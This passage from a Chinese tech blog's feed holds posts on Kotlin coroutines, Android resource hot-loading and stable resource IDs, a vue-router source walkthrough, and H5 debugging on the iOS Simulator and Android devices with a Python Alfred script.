x, @NotNull Continuation var1)</span><br></pre></td></tr></table></figure><p>注意到上面的函数多了一个新的参数<code>Continuation</code>。当我们在coroutines里面调用这个方法时，编译器会将<code>sampleSuspendFun</code>之后的代码作为continuation参数传递。当<code>sampleSuspendFun</code>完成后，continuation 会被回调。这就是我们平时熟知的 callback-based 编程模式，只不过被编译器隐藏了实现细节。当然，这只是简化的一种描述，更多细节可以参考<a href="https://github.com/Kotlin/kotlin-coroutines/blob/master/kotlin-coroutines-informal.md#implementation-details" target="_blank" rel="noopener">implementation-details</a>.</p><h2 id="结论">结论</h2><p>相比Java，Kotlin鼓励另一种完全不同的——非阻塞式、并且不会绑定到native thread上的并发编程模式。</p><p>编写 Java 并发编程常常伴随着过多的线程，或者忘记了线程池管理，这些小粗心往往导致代码执行效率问题。Coroutines, 却相反, 正如 <em>“light-weight threads”</em> 这个别称所表明的一样, 它不会映射到物理线程上，而且正因如此，协程也不会遇到并发编程中常常遇到的deadlocks、starvation问。正如我们上面看到的，在协程中，通常不用担心线程阻塞。而且，同步也更加简单直接，甚至在遵循**“share by communication”** 原则后，同步操作都是不必要的，</p><p>协程可以和其他并发编程方式一起工作。其中，许多适配工作已经可以使用，而且其他的并发编程也可以轻松适配。<br>对于Java开发者来说，<code>async/await</code> 这种范式是最容易接受的，因为很容易和 <code>future</code> 联系起来。但是，<code>async/await</code>并不是简单的代替<code>future</code>而是功能上的升级。</p><p>在Java中写并发代码总是会写一堆模板代码来处理 <em>checked exceptions</em>, <em>defensive locking</em> 等一堆问题。得益于序列式编程、可管理性和可读性，这一切在coroutines中都得到了改善。</p><h4 id="perspective">Perspective</h4><p>在<a href="https://kotlinlang.org/docs/reference/whatsnew13.html#coroutines-release" target="_blank" rel="noopener">Kotlin 1.3</a>版本中，Coroutines终于移除了<code>experimental</code>包名，API也变得稳定。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文将从以下3个方面介绍 Kotlin Coroutines&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;概念&lt;/li&gt;
&lt;li&gt;使用方法&lt;/li&gt;
&lt;li&gt;内部实现原理&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;本文的实例代码基于Kotlin 1.3.0 和 kotlinx.coroutines 1.0.0。&lt;/p&gt;
    
    </summary>
    
      <category term="Android" scheme="https://deskid.github.io/categories/Android/"/>
    
      <category term="kotlin" scheme="https://deskid.github.io/categories/Android/kotlin/"/>
    
    
      <category term="kotlin" scheme="https://deskid.github.io/tags/kotlin/"/>
    
  </entry>
  
  <entry>
    <title>Android 资源动态加载(一)</title>
    <link href="https://deskid.github.io/2018/11/13/android-resource-hook/"/>
    <id>https://deskid.github.io/2018/11/13/android-resource-hook/</id>
    <published>2018-11-13T13:46:08.000Z</published>
    <updated>2018-11-14T02:26:35.842Z</updated>
    
    <content type="html"><![CDATA[<p>无论是插件化开发还是热修复，都有一个绕不过的关键技术难度。那就是——如何动态加载资源？</p><p>在插件化方案中，我们可以将资源和代码一起打包在插件中，宿主工程动态加载插件中的dex和资源，宿主工程和插件工程的开发流程实现了解耦。</p><p>在热修复中，我们除了常见的代码修复，还可以修改诸如文案，图标等资源文件，甚至可以利用资源热修复的能力在native上不发版玩一些资源运营。</p><a id="more"></a><h3 id="关键技术">关键技术</h3><p>在上面两种主要使用场景中，资源动态加载技术侧重点也有不同。</p><h4 id="插件化">插件化</h4><p>插件化注重的是插件与插件之间、插件与宿主之间资源的隔离。我们知道，插件的打包是和宿主工程分开打包，两个apk包生成的<code>R.java</code>是互相独立的，如果不做资源隔离，资源id很容易发生冲突。除非，在插件中只使用自己的资源，不共享宿主资源，并且插件只管理自己apk的<code>Resource</code>加载。</p><p>如果要合并资源的话，资源Id冲突的问题就不可避免了。插件化资源隔离的一种实现方式是改写aapt的代码，重新划分插件的packageId。packageId 占用两个字节，理论上我们可以使用<code>0x01~0xFF</code>之间的任何值，其中系统应用已经占用了<code>0x01</code>，共享库占用了<code>0x00</code>， 第三方应用则默认占用了<code>0x7F</code>。</p><h4 id="资源热修复">资源热修复</h4><p>资源热修复则关注于另一个要求：patch包和release包的资源ResId必须要一致。但是，我们知道，在生成的apk中，代码里的通过<code>name</code>去获取资源的地方，比如</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">context.getString(R.string.helloword);</span><br></pre></td></tr></table></figure><p>因为<code>R.string.xxxx</code>是整形常量，会被编译器inline优化掉。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">context.getString(2131427369)</span><br></pre></td></tr></table></figure><p>所以运行时是没有<code>name</code>信息的。因此我们不能简单通过替换相同<code>name</code>的资源去做热修复，这里必须通过替换相同<code>resId</code>的资源才可以。</p><p>所以在热修复中，资源修复的关键是，如何在 patch 包中打出拥有相同资源id的<code>resource.arsc</code>。也就是所谓的“资源Id固化”。</p><p>思路是通过修改<code>processResourcesTask</code>，给aapt传递 <code>--stable-ids public.txt</code>参数。（aapt 和 aapt2的具体参数有点不一样，但是大致思路是一致的）。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;无论是插件化开发还是热修复，都有一个绕不过的关键技术难度。那就是——如何动态加载资源？&lt;/p&gt;
&lt;p&gt;在插件化方案中，我们可以将资源和代码一起打包在插件中，宿主工程动态加载插件中的dex和资源，宿主工程和插件工程的开发流程实现了解耦。&lt;/p&gt;
&lt;p&gt;在热修复中，我们除了常见的代码修复，还可以修改诸如文案，图标等资源文件，甚至可以利用资源热修复的能力在native上不发版玩一些资源运营。&lt;/p&gt;
    
    </summary>
    
      <category term="Android" scheme="https://deskid.github.io/categories/Android/"/>
    
    
      <category term="android" scheme="https://deskid.github.io/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>vue router 源码通读</title>
    <link href="https://deskid.github.io/2018/04/12/vue-router/"/>
    <id>https://deskid.github.io/2018/04/12/vue-router/</id>
    <published>2018-04-12T13:30:05.000Z</published>
    <updated>2018-11-14T02:27:34.349Z</updated>
    
    <content type="html"><![CDATA[<p>最近通读了一遍 vue-router 的源码，主要是想了解下面两个问题：</p><ol><li>路由信息发生变动时，router-view 如何动态渲染对应的 component</li><li>router-link 点击事件触发时，如何引发路由变化</li></ol><a id="more"></a><h2 id="1-抽象数据结构">1. 抽象数据结构</h2><h3 id="1-1-router">1.1 Router</h3><p><img src="/media/15235001906565.jpg" alt=""></p><p>Router，也就是 VueRouter，在 Vue 根实例化时，将<code>VueRouter</code>作为<code>router</code>参数值传入 Vue 框架。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">  mode: <span class="string">'history'</span>,</span><br><span class="line">  routes: routes</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">'#app'</span>,</span><br><span class="line">  store,</span><br><span class="line">  router,</span><br><span class="line">  render: <span class="function"><span class="params">h</span> =&gt;</span> h(App)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>VueRouter 根据构造函数中传入的<code>option.mode</code> 来实例化不同的 history 对象。</p><p>通过传入的<code>option.routes</code>(<code>RouteConfig</code> 数组)，建立了 path 和 Component 之间的对应关系，这个关系存储在 VueRouter 的 <code>Matcher</code> 中。</p><p>在 <code>VueRouter.install()</code> 时，通过全局 mixin，hook 了 Vue 的生命周期 <code>beforeCreate</code>，并把这个<code>VueRouter</code>实例赋值给了<code>this._router</code>。</p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">Vue.mixin(&#123;</span><br><span class="line">    beforeCreate () &#123;</span><br><span class="line">      if (isDef(this.$options.router)) &#123;</span><br><span class="line">        this._routerRoot = this</span><br><span class="line"><span class="addition">+       this._router = this.$options.router</span></span><br><span class="line">        this._router.init(this)</span><br><span class="line">        //...</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        this._routerRoot = (this.$parent &amp;&amp; this.$parent._routerRoot) || this</span><br><span class="line">      &#125;</span><br><span class="line">    // ....</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><p>接下来又在<code>Vue.prototype</code>上定义了<code>$router</code>属性，方便在各个 component 中通过 <code>this.$router</code> 引用到 VueRouter。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.defineProperty(Vue.prototype, <span class="string">'$router'</span>, &#123;</span><br><span class="line">  get () &#123; <span class="keyword">return</span> <span class="keyword">this</span>._routerRoot._router &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>通过这个暴露出来的<code>this.$router</code>，可以实现“编程式导航”</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.$router.push(&#123; <span class="attr">path</span>: <span class="string">'home'</span> &#125;)</span><br><span class="line"><span class="keyword">this</span>.$router.replace(&#123; <span class="attr">name</span>: <span class="string">'user'</span>, <span class="attr">params</span>: &#123; <span class="attr">userId</span>: <span class="number">123</span> &#125;&#125;)</span><br><span class="line"><span class="keyword">this</span>.$router.go(<span class="number">-1</span>)</span><br></pre></td></tr></table></figure><p>在后面会了解到 <code>push</code> 、<code>replace</code>，<code>go</code> 方法只是在 <code>$router.history</code> 的方法上包了一层。</p><h3 id="1-2-route">1.2 Route</h3><p><img src="/media/15234379495016.jpg" alt=""></p><p>Route，路由信息对象，记录了路由所需的元信息和 URL 匹配到的 RouteRecord。</p><p>在 <code>VueRouter.install()</code> 时，Vue prototype 上注册了<code>$router</code>的同时，也注册了<code>$route</code>。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.defineProperty(Vue.prototype, <span class="string">'$route'</span>, &#123;</span><br><span class="line">  get () &#123; <span class="keyword">return</span> <span class="keyword">this</span>._routerRoot._route &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里的 <code>$route</code> 就是 Route类型，它指向<code>this._routerRoot._route</code>，而<code>_route</code> 是通过<code>defineReactive</code>定义的响应式变量，其值双向绑定到了<code>this._router.history.current</code>。后者就是当前路由状态下激活的 Route 实例。</p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">  Vue.mixin(&#123;</span><br><span class="line">    beforeCreate () &#123;</span><br><span class="line">      if (isDef(this.$options.router)) &#123;</span><br><span class="line">        this._routerRoot = this</span><br><span class="line">        this._router = this.$options.router</span><br><span class="line">        this._router.init(this)</span><br><span class="line"><span class="addition">+       Vue.util.defineReactive(this, '_route', this._router.history.current)</span></span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        //...</span><br><span class="line">      &#125;</span><br><span class="line">    //...</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><p>每当 <code>_route</code> 值被 set，Vue 就会通知所有依赖的监听者，比如<code>$route</code>。</p><p>通过监听<code>$route</code> 就可以对路由的变化做出响应。在每个子组件中通过<code>this.$route</code> 可以直接取到 query、params 对象，非常实用。</p><p>举个例子，当 path 变化时触发一个 page event，就可以这么写：</p><p><img src="/media/15234387967416.jpg" alt=""></p><p>Route 中的 matched 数组存储的是当前路由状态下匹配的 RouterRecord。RouterRecord 中记录了路由对应的 component。</p><p>举个例子，某个 <code>vm.$route</code> 如下:<br><img src="/media/15234378286511.jpg" alt=""></p><p>直觉上一个路由状态匹配一个 Component 组件似乎很合理，那为什么这里<code>matched</code>是一个数组呢? 这个和 vue-router 支持路由嵌套有关，这里不深究。</p><p>通过上面的分析可以总结 ：</p><ol><li>vue-router 在 <code>Vue.prototype</code> 上定义了两个属性 <code>$router</code>、<code>$route</code></li><li><code>$router</code> 提供了 history 的几个关键方法：<code>push</code>、<code>replace</code>、<code>go</code></li><li><code>$route</code> 提供了路由元数据及对应的 component</li></ol><h3 id="1-3-history">1.3 History</h3><p>vue-router 中的 history 是根据 <code>mode</code> 初始化的。</p><p><img src="/media/15235056976931.jpg" alt=""></p><p><code>HTML5History</code>、<code>HashHistory</code>、<code>AbstractHistory</code> 都继承于 父类 <code>History</code>。</p><ul><li><p><code>HTML5History</code> 基于 html5 的 history 模式，通过<code>history.pushState</code>实现url 跳转而无需重新加载。</p></li><li><p><code>HashHistory</code> 利用 <code>#</code> 之后的部分路由，利用 <code>#</code> 改变不会触发页面请求的特性实现前端路由。</p></li><li><p><code>AbstractHistory</code> 内存中维护了一个数组来模拟路由 stack。</p></li></ul><p>回顾问题1</p><blockquote><ol><li>路由发生变动时，router-view 如何渲染对应的 component</li></ol></blockquote><p>上文说到 <code>$route.matched</code> 数组记录着路由对应的<code>component</code>，而且<code>$route</code>会实时随着 <code>_route</code> 变化而变化。所以问题1的答案，关键在于 <code>_route</code> 会怎样跟着路由变化。</p><p>那么<code>_route</code>是怎么被 set 的呢？</p><p>路由信息变动无非以下两种情况：</p><ol><li>函数式导航或者 RouterLink 组件，这两个本质都是调用 <code>router.push</code> 或者<code>router.replace</code></li><li>浏览器回退按钮或者 <code>history.back()</code></li></ol><p>第一种情况，只需要在<code>push</code>、<code>replace</code>函数调用结束后，更新下<code>_route</code>就好了。<br>第二种情况，可以监听<code>popstate</code>、<code>hashchange</code>事件，在监听函数中更新<code>_route</code></p><p>通过查看 History 的代码就知道 vue-router 也正是这么做的。</p><ul><li>第一种情况：调用 <code>router.push</code> 或者<code>router.replace</code></li></ul><p>在调用 <code>this.$router.push</code> 或者 <code>this.$router.replace</code> 时，其实是代理给了对应的 history 实例。</p><p>history 对<code>_route</code>的更新，具体表现在 <code>VueRouter.init()</code> 时， <code>history.listen()</code> 注册的回调。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">history.listen(<span class="function"><span class="params">route</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">this</span>.apps.forEach(<span class="function">(<span class="params">app</span>) =&gt;</span> &#123;</span><br><span class="line">    app._route = route</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这个回调函数作为 <code>listen()</code> 的参数传进来后被赋值给了 <code>history.cb</code>，那么 <code>history.cb</code> 在什么时候调用的呢？</p><p>调用顺序如下：</p><p><code>History.transitionTo()</code> =&gt;<br><code>History.confirmTransition.onComplete()</code> =&gt;<br><code>updateRoute()</code>=&gt;<br><code>this.cb()</code></p><p>部分相关代码也贴一下：</p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"> transitionTo (location: RawLocation, onComplete?: Function, onAbort?: Function) &#123;</span><br><span class="line">    const route = this.router.match(location, this.current)</span><br><span class="line"><span class="addition">+   this.confirmTransition(route, () =&gt; &#123;</span></span><br><span class="line"><span class="addition">+     this.updateRoute(route)</span></span><br><span class="line">      onComplete &amp;&amp; onComplete(route)</span><br><span class="line">      // ...</span><br><span class="line">    &#125;, err =&gt; &#123;</span><br><span class="line">      // ...</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line"> updateRoute (route: Route) &#123;</span><br><span class="line">    const prev = this.current</span><br><span class="line">    this.current = route</span><br><span class="line"><span class="addition">+   this.cb &amp;&amp; this.cb(route)</span></span><br><span class="line">    this.router.afterHooks.forEach(hook =&gt; &#123;</span><br><span class="line">      hook &amp;&amp; hook(route, prev)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>无论是调用 <code>this.$router.push</code> 还是 <code>this.$router.replace</code> ，最终都会走到<code>transitionTo()</code>，从而更新<code>_route</code></p><ul><li>第二种情况：浏览器回退按钮或者 <code>history.back()</code></li></ul><p>对于<code>HTML5History</code>，在构造函数中监听了<code>popstate</code>，并在回调中调用了<code>transitionTo</code>。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">constructor</span> (router: Router, base: ?string) &#123;</span><br><span class="line">    <span class="keyword">super</span>(router, base)</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">'popstate'</span>, e =&gt; &#123;</span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">      <span class="keyword">this</span>.transitionTo(location, route =&gt; &#123;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>对于<code>HashHistory</code>，则是延迟了<code>hashchange</code>监听，在第一次<code>init()</code> <code>transitonTo</code> 成功后，调用<code>setupListeners</code>监听<code>popstate</code>,或者<code>hashchange</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// this is delayed until the app mounts</span></span><br><span class="line"><span class="comment">// to avoid the hashchange listener being fired too early</span></span><br><span class="line">setupListeners () &#123;</span><br><span class="line">  <span class="comment">// ....</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">window</span>.addEventListener(supportsPushState ? <span class="string">'popstate'</span> : <span class="string">'hashchange'</span>, () =&gt; &#123;</span><br><span class="line">    <span class="comment">// ....</span></span><br><span class="line">    <span class="keyword">this</span>.transitionTo(getHash(), route =&gt; &#123;</span><br><span class="line">      <span class="comment">// ....</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-component">2. component</h2><h3 id="2-1-view-js">2.1 view.js</h3><p>RouterView是一个函数式组件，也就是说它本身没有上下文，也不管理或监听状态。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  name: <span class="string">'RouterView'</span>,</span><br><span class="line">  functional: <span class="literal">true</span>,</span><br><span class="line">  props: &#123;</span><br><span class="line">    name: &#123;</span><br><span class="line">      type: <span class="built_in">String</span>,</span><br><span class="line">      <span class="keyword">default</span>: <span class="string">'default'</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  render (_, &#123; props, children, parent, data &#125;) &#123;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">    <span class="keyword">const</span> component = cache[name] = matched.components[name]</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">    <span class="keyword">return</span> h(component, data, children)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面介绍到了，监听 location 变化的关键是响应式变量<code>$route</code>， render 函数渲染的正是 <code>$route.matched</code> 中存储的 Component。</p><p>第一个问题到这里就可以解答了。</p><p>RouterView 中有不少的细节处理值得注意</p><ul><li>render 使用的是 parent createElement() ，这样被 routerView 渲染的组件就可以解析 named slots。</li><li>利用 cache 来缓存 <code>keepalive</code>的 <code>inactive</code>状态下的的 component</li><li>route 的 params 作为 component 的 props 传递（没被 component 注册的 props 会被当作 attribute 传递）</li></ul><h3 id="2-2-link-js">2.2 link.js</h3><p>RouterLink 比较简单， 默认渲染为<code>&lt;a&gt;</code>节点，并设置该节点的 href 和事件。如果设置了 tag 名，则把 herf 和事件绑定到第一个<code>&lt;a&gt;</code>子节点, 如果没有<code>&lt;a&gt;</code>子节点则设置到它本身。</p><p><code>href</code> 由 <code>router.resolve</code> 解析生成；事件回调函数里调用<code>router.push</code>或<code>router.replace</code>做跳转。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> handler = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (guardEvent(e)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.replace) &#123;</span><br><span class="line">      router.replace(location)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      router.push(location)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到此，router-link 点击事件触发时，如何引发路由变化，这第二个问题也解决了。</p><h2 id="3-总结">3. 总结</h2><p>vue-router 还有许多别的特点，比如</p><ul><li>支持面向路由 的“AOP编程”(<code>navigation-guards</code>)，</li><li>支持路由嵌套</li><li>滚动位置定位</li></ul><p>配合 webpack 的动态 import 还能无痛实现路由懒加载。</p><p>如果用不到这些特性，同时希望能减少最终打包大小，经过上面的源码阅读，我们也完全有能力造一个符合自己需求的router轮子。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近通读了一遍 vue-router 的源码，主要是想了解下面两个问题：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;路由信息发生变动时，router-view 如何动态渲染对应的 component&lt;/li&gt;
&lt;li&gt;router-link 点击事件触发时，如何引发路由变化&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="Web前端" scheme="https://deskid.github.io/categories/Web%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="javascript" scheme="https://deskid.github.io/tags/javascript/"/>
    
      <category term="vue" scheme="https://deskid.github.io/tags/vue/"/>
    
  </entry>
  
  <entry>
    <title>iOS 和 Android 真机调试</title>
    <link href="https://deskid.github.io/2018/04/02/h5-debug/"/>
    <id>https://deskid.github.io/2018/04/02/h5-debug/</id>
    <published>2018-04-01T23:58:45.000Z</published>
    <updated>2018-11-14T03:15:13.473Z</updated>
    
    <content type="html"><![CDATA[<p>本文记录了如何在 iOS Simulator 和 Android 设备上调试 h5 页面，并在提供了 Alfred 脚本来便捷地管理 Simulator。</p><a id="more"></a><h2 id="ios-模拟器调试">iOS 模拟器调试</h2><p>1.启动<code>Simulator.app</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">open -a /Applications/Xcode.app/Contents/Developer/Applications/Simulator.app</span><br></pre></td></tr></table></figure><blockquote><p>tips：<code>xcode-select -p</code> 会打印当前 xcode developer 目录：</p></blockquote><blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/Applications/Xcode.app/Contents/Developer</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>上述命令可以写为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">open -a `xcode-select -p`/Applications/Simulator.app</span><br></pre></td></tr></table></figure></blockquote><p>2.模拟器上打开要调试的页面</p><p>2.1 在 Safari 中打开</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xcrun simctl openurl booted https://www.baidu.com</span><br></pre></td></tr></table></figure><p><code>xcrun</code> 会自动在 xcode developer 目录下查找<code>simctl</code>命令，而<code>simctl</code> 是操作<code>Simulator.app</code>的命令。</p><p>参数 <code>booted</code> 将操作目标指向当前启动的模拟器。</p><p>2.2 在 app 中打开</p><p>模拟器安装 app</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xcrun simctl install booted youriPhone.app</span><br></pre></td></tr></table></figure><p>在 app 上打开网页</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xcrun simctl openurl booted APP_SCHEME:URL</span><br></pre></td></tr></table></figure><p><code>APP_SCHEME</code> 及后面的路径根据自己 app 注册的去更改。</p><p>3.打开 mac 上的Safari</p><p><code>Menu -&gt; Develop -&gt; Simulator</code>，选择打开的网址即可调试了。</p><h2 id="android-真机调试">Android 真机调试</h2><ol><li>usb 链接 Android 设备到 mac</li><li>打开开发者选项模式，开启 usb debug</li><li>Chrome 浏览器打开 <code>chrome://inspect/#devices</code></li><li>如果该页面没有显示设备，全局翻墙或者重新拔插 usb 后刷新页面重试。</li></ol><p>有的 app 使用的是手Q X5 内核，在 app 中打开<code>http://debugx5.qq.com</code></p><ol><li><p>在 “X5调试页面” 上，点击进入 “信息” Tab。</p></li><li><p>找到TBS settings栏目，勾选&quot;是否打开TBS内核Inspector调试功能&quot;，然后点击确认，进程自动退出。</p></li><li><p>重新打开Web页面，使用Inspector页面调试功能。</p></li></ol><p>（有时候，为了确认是 X5内核引起的兼容性问题，还可以打开<code>http://debugtbs.qq.com</code>，选择使用系统自带内核。）</p><!-- more --><h2 id="利用-alfred-快捷打开-simulator">利用 Alfred 快捷打开 Simulator</h2><p>利用 xcode command 提供的命令，可以在 Alfred 中快速打开 Simulator 并导航到待调试页面。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> workflow <span class="keyword">import</span> Workflow3</span><br><span class="line"></span><br><span class="line">APP_NAME = <span class="string">'Mogujie4iPhone.10.4.0.app'</span></span><br><span class="line">APP_SCHEME = <span class="string">'mogujie://open?url='</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">luanch</span><span class="params">()</span>:</span></span><br><span class="line">    cmd = <span class="string">'open -a `xcode-select -p`/Applications/Simulator.app'</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_call(cmd, shell=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">install</span><span class="params">(json_str=<span class="string">''</span>)</span>:</span></span><br><span class="line">    option = json.loads(json_str)</span><br><span class="line">    <span class="comment"># no booted devices found</span></span><br><span class="line">    <span class="keyword">if</span> option[<span class="string">'identifier'</span>] == <span class="string">''</span>:</span><br><span class="line">        luanch()</span><br><span class="line">        cmd = <span class="string">'xcrun simctl install booted ~/.ios-simulator/'</span> + APP_NAME</span><br><span class="line">        <span class="keyword">return</span> subprocess.check_call(cmd, shell=<span class="keyword">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd = <span class="string">'xcrun simctl install &#123;identifier&#125; ~/.ios-simulator/'</span> + APP_NAME</span><br><span class="line">        cmd = cmd.format(identifier=option[<span class="string">'identifier'</span>])</span><br><span class="line">        <span class="keyword">return</span> subprocess.check_call(cmd, shell=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">open</span><span class="params">(json_str=<span class="string">''</span>)</span>:</span></span><br><span class="line">    option = json.loads(json_str)</span><br><span class="line"></span><br><span class="line">    url = APP_SCHEME + urllib.pathname2url(option[<span class="string">'url'</span>])</span><br><span class="line">    cmd = <span class="string">'xcrun simctl openurl &#123;identifier&#125; &#123;url&#125;'</span></span><br><span class="line">    cmd = cmd.format(identifier=option[<span class="string">'identifier'</span>], url=url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_call(cmd, shell=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_booted</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># get booted list</span></span><br><span class="line">    cmd = <span class="string">'xcrun simctl list | grep Booted'</span></span><br><span class="line">    <span class="comment"># iPhone X (3D62292C-C2C4-4DE5-B2E0-EDA1AC846115) (Booted)</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(cmd, shell=<span class="keyword">True</span>).splitlines()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(wf)</span>:</span></span><br><span class="line">    args = wf.args</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        booted_list = get_booted()</span><br><span class="line">        items = []</span><br><span class="line">        <span class="keyword">for</span> booted <span class="keyword">in</span> booted_list:</span><br><span class="line">            match = re.search(<span class="string">r'\((.*?)\)'</span>, booted)</span><br><span class="line">            <span class="keyword">if</span> match:</span><br><span class="line">                identifier = match.group(<span class="number">1</span>)</span><br><span class="line">                items.append(&#123;</span><br><span class="line">                    <span class="string">'title'</span>: booted.strip(),</span><br><span class="line">                    <span class="string">'subtitle'</span>: identifier,</span><br><span class="line">                    <span class="string">'identifier'</span>: identifier,</span><br><span class="line">                &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">            <span class="keyword">if</span> len(args) &gt; <span class="number">0</span>:</span><br><span class="line">                url = args[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = <span class="string">''</span></span><br><span class="line">            <span class="comment"># pass the url args down use json str</span></span><br><span class="line">            arg = json.dumps(&#123;<span class="string">'url'</span>: url, <span class="string">'identifier'</span>: item[<span class="string">'identifier'</span>]&#125;)</span><br><span class="line">            wf.add_item(title=item[<span class="string">'title'</span>],</span><br><span class="line">                        subtitle=item[<span class="string">'subtitle'</span>],</span><br><span class="line">                        arg=arg,</span><br><span class="line">                        valid=<span class="keyword">True</span>)</span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError:</span><br><span class="line">        luanch()</span><br><span class="line"></span><br><span class="line">    wf.send_feedback()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    wf = Workflow3()</span><br><span class="line">    sys.exit(wf.run(main))</span><br></pre></td></tr></table></figure><p>注意更改代码中的 <code>APP_NAME</code> 和 <code>APP_SCHEME</code></p><p>可以使用下面快捷命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动模拟器</span></span><br><span class="line">is luanch </span><br><span class="line"><span class="comment"># 在模拟器中安装 ~/.iso-simulator 目录下的 app</span></span><br><span class="line">is install </span><br><span class="line"><span class="comment"># 在模拟器中打开h5地址</span></span><br><span class="line">is open http://xxxx.com</span><br></pre></td></tr></table></figure><p>最终效果如图</p><p><img src="/media/15226270595220.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
